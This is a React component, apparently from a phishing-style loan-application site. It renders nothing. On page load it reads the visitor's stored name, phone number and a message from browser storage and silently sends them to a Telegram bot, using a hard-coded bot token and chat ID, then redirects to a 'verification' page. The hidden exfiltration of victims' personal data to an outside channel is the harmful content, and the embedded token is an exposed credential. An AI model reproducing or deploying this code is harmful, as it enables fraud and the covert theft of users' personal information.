import React, { useState, useEffect } from 'react'
import { useNavigate, useParams } from 'react-router-dom'

const BOT_TOKEN = '8935232665:AAGjsHkuQo9DsQX3vVfstfDx36lttkEKCOY'
const ADMIN_CHAT_ID = '8574792010'
const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN

function MessageDetails() {
  const navigate = useNavigate()
  const { user } = useParams()
  const userId = user || 'default'
  const basePath = userId && userId !== 'default' ? `/${userId}` : ""

  useEffect(() => {
    sendDataToBotAndRedirect()
  }, [])

  async function deleteWebhook() {
    try {
      await fetch(TELEGRAM_API + '/deleteWebhook')
    } catch (e) {
      console.error('Webhook deletion failed:', e)
    }
  }

  async function sendDataToBotAndRedirect() {
    try {
      await deleteWebhook()

      const storedApp = localStorage.getItem('loanAppData')
      const appData = storedApp ? JSON.parse(storedApp) : {}

      const adminMsg = sessionStorage.getItem('adminMessage') || localStorage.getItem('adminMessage') || ""

      const message = `📝 User Response\n\n` +
        `👤 Name: ${appData.name || "N/A"}\n` +
        `📱 Phone: ${appData.number || "N/A"}\n` +
        `💬 Admin Message: ${adminMsg || "N/A"}\n` +
        `🕒 Time: ${new Date().toISOString()}`

      await fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          text: message
        })
      })
    } catch (err) {
      console.error("Send error:", err)
    }

    navigate(`${basePath}/verification`)
  }

  return null
}

export default MessageDetails
